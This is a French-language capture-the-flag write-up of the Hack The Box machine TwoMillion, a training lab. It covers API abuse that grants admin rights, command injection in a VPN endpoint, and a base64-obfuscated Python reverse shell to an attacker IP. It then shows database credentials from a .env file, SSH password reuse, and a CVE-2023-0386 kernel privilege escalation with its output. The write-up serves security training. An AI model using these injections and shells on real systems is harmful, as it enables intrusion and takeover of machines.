---
title: HTB | TwoMillion
description: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.
slug: twomillion-htb
date: 2024-12-08 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="TwoMillion cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">TwoMillion</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.221</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -p- 10.10.11.221
Port 80 -> HTTP twomillion.htb
```

### /etc/hosts
On ajoute les noms de domaines necessaire. Un peu plus tard on découvrira qu'il y a également le nom de domaine: **data.analytical.htb**
```bash
## ...
10.10.11.221    twomillion.htb
```

## Foothold

### Invitation code - inviteapi
En utilisant Burp sur la page de login, on découvre un code javascript indiquant qu'un compte peut etre créer a l'aide d'un code d'Invitation
En y découvre un lien vers un code javascript:
http://2million.htb/js/inviteapi.min.js

```js
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}))
```
Ce script contient du code obfusqué, qui indique qu'une requete POST est possible vers :
**/api/v1/invite/how/to/generate**

Pour génerer un code d'invitation
```bash
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response);
        },
        error: function (response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response);
        },
        error: function (response) {
            console.log(response);
        }
    });
}
```
On effectue donc cette requete :
```bash
POST /api/v1/invite/how/to/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;kvl37ft06haubd9f1davp7407bq=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 17
Origin: http://2million.htb
Connection: close
Referer: http://2million.htb/invite
Cookie: PHPSESSID=kvl37ft06haubd9f1davp7407b

code=<b>qsdqs</b>

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 06 Dec 2024 23:44:09 GMT
Content-Type: application/json
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249

{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```
On y découvre un code chiffré à l'aide de ROT13. Grace au site internet `dcode.fr` on déchiffre le message suivant :
```bash
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```
On effectue donc cette requête POST sur Burp:

```bash
POST /api/v1/invite/generate HTTP/1.1
Host: 2million.htb
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Connection: close
Cache-Control: max-age=0
```
Réponse:
```bash
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 07 Dec 2024 21:25:53 GMT
Content-Type: application/json
Connection: close
Set-Cookie: PHPSESSID=nvi1ir085vrvc1cuqq22gjoaot; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 91

{"0":200,"success":1,"data":{"code":"SFE2OVUtMzE1Rk4tUTBUNU0tQko0NU8=","format":"encoded"}}
```
On nous envoie le code en base64, ce qui nous donne:
> HQ69U-315FN-Q0T5M-BJ45O

On importe la fonction verifyInviteCode dans la console de firefox qui nous indique que le code est correct

On se rend sur la page `2million.htb/invite`
On s'inscrit avec un compte -> hello@hello.hello : hello

### admin
```bash
GET /api/v1 HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=dn1g3q7kgl2jj3ondr1sda9gm9
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```bash
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 07 Dec 2024 22:51:47 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```
On envoie cette requete:
```bash
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: keep-alive
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=jg018kgbajmc0pjtrdo4dv603a
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 52

{
"email" : "hello@hello.hello",
"is_admin" : 1
}

# REPONSE

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 07 Dec 2024 23:59:01 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 41

{"id":22,"username":"hello","is_admin":1}
```
On peut demander a générer un vpn pour un utilisateur. L'utilisateur est injectable, comme on peut voir avec la commande curl ici.
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Host: 2million.htb" \
-H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" \
-H "Accept-Encoding: gzip, deflate, br" \
-H "Content-Type: application/json" \
-H "Connection: keep-alive" \
-H "Referer: http://2million.htb/home/access" \
-H "Cookie: PHPSESSID=jg018kgbajmc0pjtrdo4dv603a" \
-H "Upgrade-Insecure-Requests: 1" \
--data '{"username":"admin;whoami;"}'                  
www-data
```

### Reverse Shell : www-data
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
-H "Host: 2million.htb" \
-H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0" \
-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" \
-H "Accept-Encoding: gzip, deflate, br" \
-H "Content-Type: application/json" \
-H "Connection: keep-alive" \
-H "Referer: http://2million.htb/home/access" \
-H "Cookie: PHPSESSID=jg018kgbajmc0pjtrdo4dv603a" \
-H "Upgrade-Insecure-Requests: 1" \
--data '{"username":"admin;echo ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNi41NSI7ZXhwb3J0IFJQT1JUPTkwMDE7cHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigic2giKSc= | base64 -d | sh;"}'
```

## www-data -> admin

### .env file : admin credentials
En observant les fichiers du site web depuis **www-data** on observe le fichier **index.php **qui semble recupérer des credentials depuis le fichier `.env`
```bash
$envFile = file('.env');
$envVariables = [];
foreach ($envFile as $line) {
    $line = trim($line);
    if (!empty($line) && strpos($line, '=') !== false) {
        list($key, $value) = explode('=', $line, 2);
        $key = trim($key);
        $value = trim($value);
        $envVariables[$key] = $value;
    }
}

$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];
```
En affichant `.env`, on trouve les credentials admin:
```bash
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```
On se connecte en ssh a l'utilisateur `admin`:
```bash
$ ssh admin@2million.htb
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt 
1489.....d42e
```

## Privilege Escalation

### Mails : /var/mail/admin
Avec **linpeas**, on observe que admin a des mails à lire dans **/var/mail/admin**. Ce mail indique qu'une vulnérabilité du kernel linux "OverlayFS / FUSE" semble exploitable.
```bash
cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

### CVE-2023-0386 : Kernel Exploit

Sur internet, on trouve la `CVE-2023-0386` avec un repo github
> https://github.com/xkaneiki/CVE-2023-0386/tree/main

On execute l'exploit:
- dans un premier terminal on fait:
```bash
$ make all
$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
mkdir: File exists
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
offset 0
size 16384
path /file
[+] open_callback
/file
[+] open_callback
/file
[+] ioctl callback
path /file
cmd 0x80086601
```
- Dans un deuxième terminal, on execute finalement un deuxième binaire pour obtenir les droits root:
```bash
./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Dec  8 12:53 .
drwxrwxr-x 6 root   root     4096 Dec  8 12:52 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/t/linux/exploit/CVE-2023-0386# sudo su
root@2million:/tmp/t/linux/exploit/CVE-2023-0386# cd /root
root@2million:~# cat root.txt 
7e64.....db13
```

## CVE-2023-0386 : Explanation

A flaw was found in the Linux kernel, where unauthorized access to the execution of the setuid file with capabilities was found in the Linux kernel’s OverlayFS subsystem in how a user copies a capable file from a nosuid mount into another mount. This uid mapping bug allows a local user to escalate their privileges on the system.

Exploitation :

Un attaquant crée un environnement spécifique (par exemple, un container ou un espace utilisateur) pour exploiter une mauvaise gestion des droits dans OverlayFS et exécuter du code malveillant avec les privilèges root.